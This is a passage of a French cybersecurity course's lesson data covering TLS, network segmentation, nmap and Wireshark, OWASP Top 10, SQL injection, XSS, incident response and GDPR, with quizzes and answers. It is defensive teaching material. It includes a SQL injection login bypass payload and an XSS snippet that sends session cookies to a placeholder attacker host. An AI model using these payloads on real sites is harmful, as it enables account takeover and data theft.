            "Attention à un malentendu fréquent : le cadenas ne dit **pas** que le site est honnête. Un site de phishing peut avoir un certificat valide et donc un cadenas. TLS garantit que tu parles bien au serveur nommé dans l'URL, de façon chiffrée — pas que ce serveur est bienveillant.\n\n" +
            "## Le handshake, étape par étape\n\n" +
            "Quand tu te connectes en HTTPS, un **handshake** (poignée de main) a lieu avant tout échange de données. Version simplifiée d'un handshake moderne :\n\n" +
            "1. Ton navigateur annonce les versions de TLS et les algorithmes qu'il supporte.\n" +
            "2. Le serveur choisit les paramètres et envoie son **certificat**, qui contient sa clé publique.\n" +
            "3. Ton navigateur **vérifie le certificat** : est-il signé par une autorité de certification (CA) de confiance ? Correspond-il bien au domaine ? N'est-il pas expiré ni révoqué ?\n" +
            "4. Les deux parties établissent, via un échange de clés (souvent Diffie-Hellman éphémère), une **clé de session symétrique** partagée sans jamais la transmettre en clair.\n" +
            "5. Toute la suite de l'échange est chiffrée avec cette clé symétrique.\n\n" +
            "On retrouve exactement le schéma hybride de la leçon précédente : asymétrique pour authentifier et négocier, symétrique pour le débit.\n\n" +
            "## La chaîne de confiance\n\n" +
            "Pourquoi fais-tu confiance à ce certificat ? Parce qu'une **autorité de certification** l'a signé, et que le certificat de cette autorité est pré-installé dans ton système ou ton navigateur. Cela forme une **chaîne de confiance** qui remonte jusqu'à un certificat racine. Si un maillon casse — CA compromise, certificat auto-signé, horloge fausse — le navigateur affiche un avertissement qu'il ne faut jamais ignorer machinalement.\n\n" +
            "> Le **HSTS** force le navigateur à toujours utiliser HTTPS pour un site, ce qui empêche une attaque de rétrogradation vers HTTP en clair. C'est une ligne à activer côté serveur, et un bon réflexe pour tout site sérieux.\n\n" +
            "Un dernier point pratique : préfère TLS 1.2 et surtout **TLS 1.3**, plus rapide et débarrassé des vieux algorithmes fragiles. Les versions SSL et TLS 1.0/1.1 sont obsolètes et doivent être désactivées côté serveur.",
        },
        {
          id: "l13",
          title: "Quiz — Malwares et cryptographie",
          type: "quiz",
          duration: "7 min",
          questions: [
            {
              id: "q9",
              prompt:
                "Une organisation a des sauvegardes quotidiennes, mais elles sont stockées sur un partage réseau accessible en écriture depuis les serveurs de production. Pourquoi est-ce risqué face à un ransomware ?",
              options: [
                "Les sauvegardes réseau sont toujours trop lentes",
                "Un ransomware qui atteint le réseau peut chiffrer ou supprimer ces sauvegardes en même temps que le reste",
                "Les sauvegardes quotidiennes sont insuffisantes en fréquence",
                "Le partage réseau ne permet pas le chiffrement des sauvegardes",
              ],
              correctIndex: 1,
              explanation:
                "Une sauvegarde en ligne et accessible depuis le réseau subit le même sort que les données de production. D'où la règle 3-2-1 avec au moins une copie hors ligne ou immuable, hors de portée de l'attaquant.",
            },
            {
              id: "q10",
              prompt: "Pourquoi TLS utilise-t-il à la fois chiffrement asymétrique et symétrique ?",
              options: [
                "Pour doubler la longueur des clés",
                "Parce que l'asymétrique sert à authentifier le serveur et à négocier une clé, tandis que le symétrique, rapide, chiffre ensuite tout le trafic",
                "Parce que le symétrique est plus sûr que l'asymétrique",
                "Pour être compatible avec les anciens navigateurs",
              ],
              correctIndex: 1,
              explanation:
                "C'est le chiffrement hybride. L'asymétrique résout la distribution de clé et l'authentification, mais il est lent ; on l'utilise donc juste pour établir une clé de session symétrique qui, elle, chiffre efficacement les données.",
            },
            {
              id: "q11",
              prompt:
                "Un site de phishing affiche bien le cadenas HTTPS dans le navigateur. Qu'est-ce que cela prouve ?",
              options: [
                "Que le site est légitime et sûr",
                "Que la connexion est chiffrée et que tu parles bien au serveur indiqué dans l'URL, sans rien garantir sur son honnêteté",
                "Que le certificat a été volé",
                "Que le site ne peut pas voler tes données",
              ],
              correctIndex: 1,
              explanation:
                "TLS garantit confidentialité, intégrité et l'identité du serveur nommé dans l'URL. Il ne juge pas des intentions du propriétaire. N'importe qui peut obtenir un certificat valide pour son domaine, y compris un escroc.",
            },
            {
              id: "q12",
              prompt:
                "Pour stocker les mots de passe des utilisateurs d'une application, quelle approche est correcte ?",
              options: [
                "Les chiffrer en AES pour pouvoir les redéchiffrer si besoin",
                "Les stocker en clair mais dans une base protégée",
                "Les hacher avec une fonction lente et salée (par ex. bcrypt/argon2), sans jamais pouvoir les redéchiffrer",
                "Les encoder en base64",
              ],
              correctIndex: 2,
              explanation:
                "Un mot de passe ne doit jamais pouvoir être redéchiffré : on le hache avec une fonction lente et salée conçue pour ça (bcrypt, scrypt, argon2). Le chiffrement réversible expose tout si la clé fuite, et base64 n'est qu'un encodage, pas une protection.",
            },
          ],
        },
      ],
    },
    {
      id: "p4",
      title: "Sécurité réseau et vulnérabilités web",
      lessons: [
        {
          id: "l14",
          title: "Pare-feu et segmentation réseau",
          type: "text",
          duration: "15 min",
          body:
            "## Le pare-feu, portier du trafic\n\n" +
            "Un **pare-feu** (firewall) filtre le trafic réseau selon des règles : on autorise ou on bloque en fonction de l'adresse source, de l'adresse destination, du port et du protocole. La bonne posture est **deny by default** : tout est interdit, sauf ce qu'on autorise explicitement. C'est l'inverse de « tout est ouvert sauf ce qu'on interdit », qui laisse toujours des trous qu'on a oublié de boucher.\n\n" +
            "Il faut distinguer deux directions :\n\n" +
            "- Le filtrage **entrant** (ingress) empêche les connexions non sollicitées venues de l'extérieur.\n" +
            "- Le filtrage **sortant** (egress), souvent négligé, limite ce qui peut sortir. Il gêne l'exfiltration de données et empêche un malware de joindre son serveur de commande.\n\n" +
            "Les pare-feux modernes vont plus loin que le port : les **pare-feux applicatifs** (NGFW, ou WAF pour le web) inspectent le contenu et peuvent bloquer une requête d'injection SQL ou un fichier malveillant.\n\n" +
            "## La segmentation, pour cloisonner les dégâts\n\n" +
            "Un réseau à plat, où toutes les machines se parlent librement, est un cadeau pour un attaquant : une seule machine compromise donne accès à tout. La **segmentation** découpe le réseau en zones isolées, avec un filtrage entre elles. On sépare typiquement :\n\n" +
            "- la **DMZ** (zone démilitarisée), où vivent les serveurs exposés à Internet (site web, mail),\n" +
            "- le réseau **bureautique** des employés,\n" +
            "- les serveurs internes sensibles (base RH, comptabilité),\n" +
            "- les systèmes industriels ou de gestion, à part.\n\n" +
            "L'idée : si un poste bureautique est infecté par un ransomware, la segmentation l'empêche d'atteindre directement les serveurs critiques. On retrouve la défense en profondeur : chaque frontière interne ralentit le déplacement latéral vu dans la partie ransomware.\n\n" +
            "## Vers le Zero Trust\n\n" +
            "Le modèle historique — « dur à l'extérieur, mou à l'intérieur » — suppose que tout ce qui est dans le réseau est de confiance. C'est faux dès qu'un attaquant a mis un pied dedans. Le modèle **Zero Trust** renverse l'hypothèse : on ne fait confiance à rien par défaut, on vérifie à chaque accès l'identité, l'appareil et le contexte, quelle que soit la position dans le réseau. La micro-segmentation en est la traduction concrète.\n\n" +
            "> Un pare-feu bien configuré et un réseau bien segmenté ne stoppent pas toutes les attaques, mais ils transforment une compromission catastrophique en incident circonscrit. C'est souvent la différence entre « une machine à reconstruire » et « toute l'entreprise à l'arrêt ».\n\n" +
            "Point de vigilance : les règles de pare-feu pourrissent avec le temps. On ajoute des autorisations « temporaires » qui restent des années. Une revue régulière des règles, pour supprimer celles qui ne servent plus, fait partie de l'hygiène réseau.",
        },
        {
          id: "l15",
          title: "Démonstration : reconnaissance avec nmap et Wireshark",
          type: "video",
          duration: "14 min",
          videoLabel: "Cartographier une machine avec nmap puis lire le trafic avec Wireshark",
          body:
            "## Cadre : uniquement sur ce qui t'appartient\n\n" +
            "Scanner ou capturer le trafic d'un système sans autorisation est illégal dans la plupart des pays, France comprise. Cette démonstration se fait sur une machine virtuelle locale que l'on contrôle. On regarde le réseau du point de vue de l'attaquant pour mieux se défendre, jamais sur autrui.\n\n" +
            "## nmap : voir ce qui est exposé\n\n" +
            "**nmap** est l'outil de référence pour découvrir les machines d'un réseau et les ports ouverts. La première chose qu'un attaquant fait, c'est cartographier ta surface d'attaque ; autant la voir avant lui.\n\n" +
            "Un scan de découverte simple :\n\n" +
            "```bash\n" +
            "# Scanner les ports d'une machine locale de test\n" +
            "nmap -sV 192.168.56.10\n" +
            "```\n\n" +
            "L'option `-sV` tente d'identifier la **version** des services derrière chaque port ouvert. La sortie ressemble à ceci :\n\n" +
            "```text\n" +
            "PORT     STATE  SERVICE  VERSION\n" +
            "22/tcp   open   ssh      OpenSSH 8.2p1\n" +
            "80/tcp   open   http     nginx 1.18.0\n" +
            "3306/tcp open   mysql    MySQL 5.7.33\n" +
            "```\n\n" +
            "Ce que ça révèle, et ce qui doit t'alerter : le port **3306** (MySQL) est ouvert. Une base de données ne devrait presque jamais être joignable au-delà de sa zone de confiance. Voilà un candidat immédiat à fermer ou à restreindre par pare-feu. On lit aussi les versions exactes : si une version est connue pour une faille, l'attaquant le sait aussi.\n\n" +
            "## Wireshark : lire le trafic\n\n" +
            "**Wireshark** capture et décode le trafic réseau paquet par paquet. C'est un microscope : indispensable pour comprendre, diagnostiquer et détecter l'anormal.\n\n" +
            "Dans la démonstration, on capture une connexion à un vieux service en **HTTP** (non chiffré), puis on applique un filtre d'affichage :\n\n" +
            "```text\n" +
            "http.request.method == \"POST\"\n" +
            "```\n\n" +
            "On ouvre le paquet du formulaire de connexion, et on lit, en clair dans le corps de la requête, `username=admin&password=secret123`. C'est la démonstration frappante de pourquoi HTTP sans TLS est inacceptable : n'importe qui sur le chemin réseau lit les identifiants.\n\n" +
            "On refait ensuite la même connexion en **HTTPS**. Cette fois, Wireshark ne montre que du **TLS** chiffré : impossible de lire le mot de passe. La théorie de la leçon TLS devient tangible.\n\n" +
            "> À retenir : nmap répond à « qu'est-ce qui est exposé ? », Wireshark à « qu'est-ce qui circule vraiment ? ». Les deux sont dans la trousse de tout défenseur, et les utiliser sur ton propre réseau t'apprend plus que n'importe quel schéma.\n\n" +
            "Prolongement défensif : le trafic en clair repéré ci-dessus est exactement ce qu'un système de détection d'intrusion (IDS) surveille en continu, pour lever une alerte quand un motif suspect apparaît.",
        },
        {
          id: "l16",
          title: "OWASP Top 10 : la carte des risques web",
          type: "text",
          duration: "15 min",
          body:
            "## À quoi sert l'OWASP Top 10\n\n" +
            "L'**OWASP** (Open Worldwide Application Security Project) est une fondation à but non lucratif qui publie des ressources libres sur la sécurité applicative. Son document le plus connu est le **Top 10** : un classement des catégories de risques les plus critiques pour les applications web, mis à jour tous les quelques années à partir de données réelles. Ce n'est pas une norme exhaustive, mais une base de priorisation que tout développeur et testeur devrait connaître.\n\n" +
            "## Les catégories majeures (version 2021)\n\n" +
            "1. **Broken Access Control** — contrôle d'accès défaillant. La faille la plus répandue : un utilisateur accède à des ressources ou actions qui ne lui sont pas destinées (voir un dossier en changeant un `id` dans l'URL, atteindre une page admin sans droits).\n" +
            "2. **Cryptographic Failures** — mauvaise gestion de la cryptographie : données sensibles non chiffrées, algorithmes obsolètes, secrets en dur.\n" +
            "3. **Injection** — l'application mélange des données non fiables avec une commande interprétée. L'injection SQL en est l'exemple emblématique ; on lui consacre la leçon suivante. Le XSS y est aussi rattaché.\n" +
            "4. **Insecure Design** — la faille est dans la conception, pas seulement le code. On ne la corrige pas avec un patch, il faut repenser le fonctionnement.\n" +
            "5. **Security Misconfiguration** — configuration par défaut, service de debug laissé actif, en-têtes de sécurité absents, compte par défaut non changé.\n" +
            "6. **Vulnerable and Outdated Components** — une bibliothèque ou un framework obsolète et vulnérable. Le drame Log4Shell (2021) en est l'illustration : une simple dépendance de journalisation a exposé des millions de serveurs.\n" +
            "7. **Identification and Authentication Failures** — gestion des sessions et de l'authentification bâclée : sessions qui n'expirent pas, absence de protection contre le bourrage d'identifiants.\n" +
            "8. **Software and Data Integrity Failures** — on fait confiance à du code ou des données sans vérifier leur intégrité (mises à jour non signées, pipeline CI/CD compromis).\n" +
            "9. **Security Logging and Monitoring Failures** — sans journaux ni surveillance, on ne détecte pas les attaques et on ne peut pas enquêter après coup.\n" +
            "10. **Server-Side Request Forgery (SSRF)** — on pousse le serveur à émettre des requêtes vers des cibles internes qu'il ne devrait pas atteindre.\n\n" +
            "## Le fil conducteur\n\n" +
            "Derrière la variété, un principe revient sans cesse : **ne jamais faire confiance à une entrée**. Qu'elle vienne d'un formulaire, d'une URL, d'un en-tête HTTP ou d'une API, toute donnée fournie par un client doit être validée, et toute donnée réinjectée quelque part doit être correctement encodée pour son contexte de destination.\n\n" +
            "> Le Top 10 n'est pas une liste de bugs à cocher, c'est une grille de lecture. Un vrai audit va au-delà, mais si tu maîtrises ces dix familles, tu élimines l'immense majorité des failles réellement exploitées.\n\n" +
            "Dans les deux leçons suivantes, on descend au niveau du code sur les deux failles d'injection les plus emblématiques : l'injection SQL et le XSS.",
        },
        {
          id: "l17",
          title: "Injection SQL, en détail",
          type: "text",
          duration: "16 min",
          body:
            "## Le mécanisme\n\n" +
            "Une **injection SQL** (SQLi) survient quand une application construit une requête à la base de données en collant directement une donnée fournie par l'utilisateur dans le texte de la requête. L'attaquant écrit alors une entrée qui n'est plus de la donnée mais du **code SQL**, et la base l'exécute.\n\n" +
            "Voici du code vulnérable, tel qu'on en trouve encore trop souvent :\n\n" +
            "```python\n" +
            "# VULNÉRABLE — ne jamais faire ça\n" +
            "def login(username, password):\n" +
            "    query = \"SELECT * FROM users WHERE name = '\" + username + \"' AND pass = '\" + password + \"'\"\n" +
            "    return db.execute(query)\n" +
            "```\n\n" +
            "Si l'utilisateur saisit comme nom `' OR '1'='1' --`, la requête devient :\n\n" +
            "```sql\n" +
            "SELECT * FROM users WHERE name = '' OR '1'='1' --' AND pass = '...'\n" +
            "```\n\n" +
            "La condition `'1'='1'` est toujours vraie, et `--` met en commentaire tout ce qui suit, y compris la vérification du mot de passe. Résultat : l'attaquant est authentifié sans identifiant valide. Avec des variantes (`UNION SELECT`), il peut aussi **lire d'autres tables**, extraire toute la base, voire dans certains cas exécuter des commandes.\n\n" +
            "## La parade : les requêtes paramétrées\n\n" +
            "La solution n'est ni de « filtrer les guillemets » ni d'interdire des mots-clés — ces approches se contournent. La bonne réponse est de **séparer le code des données** avec des **requêtes paramétrées** (prepared statements). Le pilote de base de données envoie d'un côté la structure de la requête, de l'autre les valeurs, qui ne sont jamais interprétées comme du SQL.\n\n" +
            "```python\n" +
            "# SÛR — requête paramétrée\n" +
            "def login(username, password):\n" +
            "    query = \"SELECT * FROM users WHERE name = ? AND pass = ?\"\n" +
            "    return db.execute(query, (username, password))\n" +
            "```\n\n" +
            "Ici, quoi que contienne `username`, il reste une valeur. Le `' OR '1'='1` sera cherché littéralement comme nom d'utilisateur, ne trouvera personne, et l'attaque échoue. Presque tous les langages et ORM proposent ce mécanisme ; il n'y a aucune raison de coder autrement.\n\n" +
            "## Défense en profondeur autour de la SQLi\n\n" +
            "Les requêtes paramétrées règlent le problème à la racine, mais on ajoute des couches :\n\n" +
            "- **Moindre privilège** sur le compte base de données : l'application n'a pas besoin de `DROP TABLE` ni d'accès aux tables système. Une injection réussie fait alors beaucoup moins de dégâts.\n" +
            "- **Validation d'entrée** : un champ « âge » n'accepte que des chiffres. Ça n'empêche pas la SQLi à soi seul, mais ça réduit la surface.\n" +
            "- **WAF** : un pare-feu applicatif peut bloquer des motifs d'injection connus. C'est un filet, pas la solution.\n" +
            "- **Messages d'erreur discrets** : ne jamais renvoyer l'erreur SQL brute au client, qui renseigne l'attaquant sur la structure de la base.\n\n" +
            "> Retiens une phrase : « les données ne doivent jamais devenir du code ». Toute l'injection tient là-dedans, et la solution — séparer les deux — vaut aussi pour les commandes système et les requêtes NoSQL.",
        },
        {
          id: "l18",
          title: "XSS et test avec OWASP ZAP",
          type: "text",
          duration: "16 min",
          body:
            "## Le principe du XSS\n\n" +
            "Le **XSS** (Cross-Site Scripting) est l'injection appliquée au navigateur. L'application affiche une donnée fournie par un utilisateur sans l'encoder, et cette donnée contient du code **JavaScript** qui s'exécute dans le navigateur d'autres visiteurs. L'attaquant ne vise pas le serveur mais les utilisateurs du site.\n\n" +
            "Imagine un champ de commentaire qui réaffiche le texte tel quel. Un attaquant poste :\n\n" +
            "```html\n" +
            "<script>fetch('https://vol.exemple/c?k=' + document.cookie)</script>\n" +
            "```\n\n" +
            "Chaque visiteur qui charge la page exécute ce script, qui envoie son **cookie de session** à l'attaquant. Avec ce cookie, l'attaquant peut usurper la session sans connaître le mot de passe — et cela contourne même le MFA, puisque la session est déjà ouverte.\n\n" +
            "## Les trois familles de XSS\n\n" +
            "- **Stored** (persistant) : le code est enregistré côté serveur (commentaire, profil) et frappe tous ceux qui voient la page. Le plus dangereux.\n" +
            "- **Reflected** (réfléchi) : le code est renvoyé immédiatement à partir de la requête (souvent via un paramètre d'URL piégé envoyé par phishing).\n" +
            "- **DOM-based** : la faille est dans le JavaScript côté client qui manipule le DOM à partir d'une entrée non fiable.\n\n" +
            "## La parade : encoder à la sortie\n\n" +
            "La règle est d'**encoder les données selon leur contexte d'affichage**. Dans du HTML, on transforme les caractères dangereux en entités : `<` devient `&lt;`, `>` devient `&gt;`. Le navigateur affiche alors `<script>` comme du texte inoffensif au lieu de l'exécuter.\n\n" +
            "Les frameworks modernes (React, Angular, Vue) encodent par défaut, ce qui élimine la majorité des XSS — à condition de ne pas contourner cette protection (le `dangerouslySetInnerHTML` de React, par exemple, doit être manié avec une extrême prudence). On complète avec une **Content Security Policy (CSP)**, un en-tête HTTP qui restreint les scripts autorisés et limite l'impact d'un XSS qui passerait.\n\n" +
            "## Tester avec OWASP ZAP\n\n" +
            "**OWASP ZAP** (Zed Attack Proxy) est un scanner de sécurité web libre et gratuit, maintenu par la communauté OWASP. Il s'intercale comme **proxy** entre ton navigateur et l'application, ce qui lui permet de voir et de manipuler toutes les requêtes.\n\n" +
            "Le déroulé d'un test légitime, sur ta propre application :\n\n" +
            "1. Configurer ZAP en proxy et parcourir le site pour qu'il découvre les pages (le **spider**).\n" +
            "2. Lancer un **scan passif** : ZAP analyse le trafic et signale les problèmes visibles (en-têtes de sécurité manquants, cookies non sécurisés).\n" +
            "3. Lancer un **scan actif** : ZAP envoie des charges de test (dont des tentatives de XSS et de SQLi) sur les points d'entrée et observe les réponses.\n" +
            "4. Lire le rapport, trier les vrais positifs des faux, et corriger.\n\n" +
            "> Un scanner comme ZAP trouve les failles connues et évidentes ; il ne remplace pas la revue de code ni un test d'intrusion manuel. Mais l'intégrer tôt, même dans un pipeline d'intégration continue, attrape énormément de choses avant la production.\n\n" +
            "Comme pour nmap, la règle absolue : on ne teste que des systèmes qu'on possède ou pour lesquels on a une autorisation écrite.",
        },
        {
          id: "l19",
          title: "Quiz — Réseau et web",
          type: "quiz",
          duration: "7 min",
          questions: [
            {
              id: "q13",
              prompt:
                "Une application corrige son injection SQL en supprimant les apostrophes des entrées utilisateur. Est-ce une défense fiable ?",
              options: [
                "Oui, c'est la méthode recommandée",
                "Non : le filtrage par liste noire se contourne ; la vraie solution est la requête paramétrée qui sépare code et données",
                "Oui, à condition d'y ajouter la suppression des espaces",
                "Non, il faut chiffrer la base de données",
              ],
              correctIndex: 1,
              explanation:
                "Filtrer des caractères est fragile : encodages alternatifs, autres syntaxes et contextes contournent la liste noire. Les requêtes paramétrées traitent l'entrée comme une pure donnée, jamais comme du code, ce qui règle le problème à la source.",
            },
            {
              id: "q14",
              prompt:
                "Un scan nmap révèle un port 3306 (MySQL) ouvert et accessible depuis Internet. Quelle est la bonne réaction ?",
              options: [
                "Rien, MySQL est conçu pour être exposé",
                "Restreindre l'accès à ce port aux seules machines autorisées via le pare-feu, idéalement le rendre injoignable depuis Internet",
                "Changer le port par défaut et le laisser exposé",
                "Installer un antivirus sur le serveur de base de données",
              ],
              correctIndex: 1,
              explanation:
                "Une base de données ne devrait presque jamais être joignable depuis Internet. On réduit la surface d'attaque en la plaçant derrière le pare-feu, accessible uniquement depuis les serveurs applicatifs. Changer le port (sécurité par l'obscurité) ne protège pas d'un scan sérieux.",
            },
            {
              id: "q15",
              prompt:
                "En quoi une faille XSS peut-elle contourner l'authentification à deux facteurs d'une victime ?",
              options: [
                "Elle devine le mot de passe et le code TOTP",
                "Elle vole le cookie de session déjà ouverte, ce qui permet d'usurper la session sans repasser par l'authentification",
                "Elle désactive le MFA côté serveur",
                "Elle ne peut pas contourner le MFA",
              ],
              correctIndex: 1,
              explanation:
                "Le XSS s'exécute dans le navigateur de la victime, une fois qu'elle est déjà connectée. En volant le cookie de session, l'attaquant réutilise une session valide : le MFA a déjà eu lieu et n'est pas redemandé. D'où l'importance des cookies HttpOnly et d'une bonne CSP.",
            },
            {
              id: "q16",
              prompt:
                "La segmentation réseau limite surtout laquelle de ces phases d'une attaque ransomware ?",
              options: [
                "L'accès initial par phishing",
                "Le déplacement latéral entre machines une fois qu'un poste est compromis",
                "L'envoi de l'email piégé",
                "La rédaction de la note de rançon",
              ],
              correctIndex: 1,
              explanation:
                "Une fois à l'intérieur, l'attaquant cherche à se propager vers les serveurs critiques et les sauvegardes. Des zones cloisonnées avec filtrage entre elles freinent ce déplacement latéral et cantonnent l'incident. La segmentation n'empêche pas le clic initial, elle en limite les conséquences.",
            },
          ],
        },
      ],
    },
    {
      id: "p5",
      title: "Défendre pour de vrai : incident, loi et hygiène",
      lessons: [
        {
          id: "l20",
          title: "Réponse à incident : les six phases",
          type: "text",
          duration: "16 min",
          body:
            "## Ce n'est pas une improvisation\n\n" +
            "Un incident de sécurité arrivera. La question n'est pas « si » mais « quand », et surtout « est-ce qu'on saura quoi faire ». La **réponse à incident** suit un cycle éprouvé, formalisé notamment par le SANS et le NIST, en six phases. Les connaître à froid évite la panique à chaud.\n\n" +
            "## 1. Préparation\n\n" +
            "Tout se joue avant. On écrit un **plan de réponse** : qui fait quoi, qui décide, qui prévient les autorités, qui parle à la presse. On liste les contacts (interne, prestataire, assurance, autorité comme la CNIL ou l'ANSSI en France). On s'assure d'avoir les moyens techniques : journaux centralisés, sauvegardes testées, outils d'investigation. Un plan qu'on n'a jamais répété ne tient pas ; on fait des exercices.\n\n" +
            "## 2. Identification\n\n" +
            "On détecte et on qualifie : est-ce vraiment un incident, quelle est son ampleur, quels systèmes et quelles données sont touchés ? C'est là que servent la journalisation et la surveillance (souvenons-nous du point 9 de l'OWASP Top 10). On documente tout, horodaté, dès le début : cette traçabilité sera précieuse, y compris juridiquement.\n\n" +
            "## 3. Confinement\n\n" +
            "On stoppe la propagation. Confinement à court terme : isoler les machines touchées du réseau, couper un accès compromis, sans tout casser. Confinement à long terme : préparer un retour propre. Attention, un réflexe fréquent mais coûteux : tout éteindre trop vite peut détruire des preuves en mémoire vive. On isole plutôt qu'on débranche brutalement, quand c'est possible.\n\n" +
            "## 4. Éradication\n\n" +
            "On retire la cause : supprimer le malware, fermer la vulnérabilité exploitée, révoquer les identifiants compromis, reconstruire proprement les systèmes atteints. Rétablir une machine sans avoir compris **comment** l'attaquant est entré garantit qu'il reviendra par la même porte.\n\n" +
            "## 5. Récupération\n\n" +
            "On remet en production, prudemment : restaurer depuis des sauvegardes saines, surveiller de près les systèmes rétablis pour détecter une éventuelle réinfection, revenir progressivement à la normale. C'est ici que la qualité des sauvegardes vue en partie 3 fait toute la différence.\n\n" +
            "## 6. Leçons apprises\n\n" +
            "Quelques jours après, à froid, on réunit les acteurs pour un **retour d'expérience** : que s'est-il passé, qu'est-ce qui a bien marché, qu'est-ce qui a manqué, que change-t-on ? Sans jugement des personnes — on cherche les défaillances de processus, pas des coupables. C'est cette phase qui transforme un incident douloureux en amélioration durable, et qui boucle la boucle vers la préparation.\n\n" +
            "> Le meilleur moment pour écrire ton plan de réponse, c'est aujourd'hui, quand tout va bien. Le pire, c'est un vendredi soir avec les serveurs chiffrés et un décideur qui demande « on fait quoi ? » sans que personne n'ait la réponse.",
        },
        {
          id: "l21",
          title: "RGPD et notification de violation de données",
          type: "text",
          duration: "15 min",
          body:
            "## La sécurité est aussi une obligation légale\n\n" +
            "En Europe, protéger les données personnelles n'est pas qu'une bonne pratique, c'est la loi. Le **RGPD** (Règlement Général sur la Protection des Données), entré en application en mai 2018, s'applique à toute organisation qui traite des données de personnes situées dans l'Union européenne, où qu'elle soit basée. Une donnée personnelle, c'est toute information se rapportant à une personne identifiable : nom, email, adresse IP, identifiant, données de localisation.\n\n" +
            "Quelques principes structurants pour un professionnel de la sécurité :\n\n" +
            "- **Minimisation** : ne collecter que les données nécessaires. Moins de données stockées, moins de risque et moins d'impact en cas de fuite. La sécurité et la conformité se rejoignent ici.\n" +
            "- **Limitation de conservation** : ne pas garder les données indéfiniment.\n" +
            "- **Sécurité** (article 32) : mettre en place des mesures techniques et organisationnelles appropriées — le chiffrement et la pseudonymisation y sont explicitement cités.\n" +
            "- **Privacy by design** : penser la protection dès la conception, pas en rustine.\n\n" +
            "## La notification de violation\n\n" +
            "C'est le point qui touche directement la réponse à incident. Une **violation de données** (data breach) est une atteinte à la sécurité entraînant destruction, perte, altération ou divulgation non autorisée de données personnelles. Le RGPD impose deux obligations :\n\n" +
            "1. **Notifier l'autorité de contrôle** (en France, la **CNIL**) dans les **72 heures** après en avoir pris connaissance, sauf si la violation est peu susceptible d'engendrer un risque pour les personnes. Ce délai est court : d'où l'intérêt d'un plan prêt.\n" +
            "2. **Informer les personnes concernées** sans délai injustifié lorsque la violation risque d'engendrer un **risque élevé** pour leurs droits et libertés (par exemple une fuite de mots de passe ou de données bancaires).\n\n" +
            "La notification à la CNIL décrit la nature de la violation, les catégories et le nombre approximatif de personnes touchées, les conséquences probables et les mesures prises. Tenir un **registre des violations**, même celles qu'on ne notifie pas, est également obligatoire.\n\n" +
            "## Ce que ça change concrètement\n\n" +
            "Les sanctions peuvent atteindre **20 millions d'euros ou 4 % du chiffre d'affaires annuel mondial**, le plus élevé des deux. Au-delà de l'amende, une violation mal gérée coûte en confiance et en réputation. Il y a un détail qui a des conséquences directes sur ton architecture : si les données volées étaient **chiffrées** correctement et que la clé n'a pas fuité, le risque pour les personnes est fortement réduit, ce qui peut éviter l'obligation de les informer individuellement. Le chiffrement au repos n'est pas qu'une case technique, c'est un amortisseur juridique.\n\n" +
            "> La conformité RGPD et la bonne sécurité ne s'opposent pas : minimiser les données, les chiffrer, savoir réagir en 72 heures, ce sont les mêmes réflexes vus tout au long du cours, avec une obligation légale en plus.",
        },
        {
          id: "l22",
          title: "Construire une hygiène de sécurité durable",
          type: "text",
          duration: "15 min",
          body:
            "## La sécurité est une routine, pas un projet\n\n" +
            "On a couvert beaucoup de terrain : principes, attaques, cryptographie, réseau, web, incident, loi. Le piège serait d'en faire une opération ponctuelle. La sécurité qui tient dans le temps est une **hygiène** : des gestes réguliers, modestes, répétés. Voici comment traduire tout le cours en pratique durable, pour un individu comme pour une petite organisation.\n\n" +
            "## Le socle personnel\n\n" +
            "Si tu ne devais retenir que quelques actions, ce seraient celles-ci, par ordre de rendement :\n\n" +
            "1. **Un gestionnaire de mots de passe** (Bitwarden par exemple) avec un mot de passe unique par service. C'est le geste qui neutralise le credential stuffing.\n" +
            "2. **Le MFA partout où c'est possible**, en priorité sur ta messagerie principale, qui commande la réinitialisation de tout le reste. Application TOTP au minimum, clé physique pour le critique.\n" +
            "3. **Les mises à jour**, automatiques quand c'est possible. La majorité des attaques exploitent des failles déjà corrigées.\n" +
            "4. **Des sauvegardes** selon la règle 3-2-1, avec au moins une copie hors ligne, et une restauration testée.\n" +
            "5. **Le doute méthodique** face aux messages : vérifier l'expéditeur, ne pas cliquer dans l'urgence, confirmer par un autre canal.\n\n" +
            "Vérifie régulièrement tes adresses sur [Have I Been Pwned](https://haveibeenpwned.com) et active ses alertes : tu seras prévenu si un service où tu es inscrit subit une fuite, et tu pourras changer le mot de passe concerné avant qu'il ne serve.\n\n" +
            "## Le socle organisationnel\n\n" +
            "Pour une équipe, on ajoute des processus :\n\n" +
            "- **Inventaire des actifs** : on ne protège pas ce qu'on ne connaît pas. La liste des machines, services, comptes et données est le point de départ de toute analyse de risque.\n" +
            "- **Gestion des accès** : provisioning à l'arrivée, deprovisioning le jour du départ, revue périodique, moindre privilège partout.\n" +
            "- **Gestion des correctifs** : un processus qui suit les vulnérabilités et applique les patchs selon leur criticité.\n" +
            "- **Journalisation et surveillance** : sans logs, pas de détection ni d'enquête.\n" +
            "- **Sensibilisation continue** : de vraies campagnes, pas une réunion annuelle oubliée le lendemain. Les tests de phishing internes, faits sans culpabiliser les gens, fonctionnent bien.\n" +
            "- **Un plan de réponse à incident écrit et répété.**\n\n" +
            "## Le bon état d'esprit\n\n" +
            "Aucune de ces mesures n'est parfaite, et c'est normal. La sécurité n'est pas un état binaire « protégé / vulnérable », c'est une gestion continue du risque avec des ressources limitées. L'objectif réaliste n'est pas d'être imprenable — personne ne l'est — mais d'être une cible coûteuse, de détecter vite, et de savoir se relever.\n\n" +
            "> Tu as maintenant la grille pour raisonner : identifier ce qui compte, comprendre comment on l'attaque, empiler des défenses, et réagir quand une couche cède. C'est exactement ce que fait un professionnel, chaque jour. La suite, c'est la pratique — sur tes propres systèmes, jamais sur ceux des autres.",
        },
        {
          id: "l23",
          title: "Quiz — Incident, loi et hygiène",
          type: "quiz",
          duration: "7 min",
          questions: [
            {
              id: "q17",
              prompt:
                "Pendant un incident, un administrateur veut immédiatement éteindre le serveur compromis pour « arrêter l'attaque ». Quel est le principal risque de ce réflexe ?",
              options: [
                "Cela consomme trop d'électricité",
                "Cela peut détruire des preuves volatiles en mémoire vive, utiles à l'investigation",
                "Cela ne sert à rien car l'attaquant a déjà tout",
                "Cela viole automatiquement le RGPD",
              ],
              correctIndex: 1,
              explanation:
                "Beaucoup d'informations (processus en cours, connexions, clés en mémoire) disparaissent à l'extinction. En phase de confinement, on privilégie l'isolation réseau pour stopper la propagation tout en préservant les preuves, plutôt qu'un arrêt brutal.",
            },
            {
              id: "q18",
              prompt:
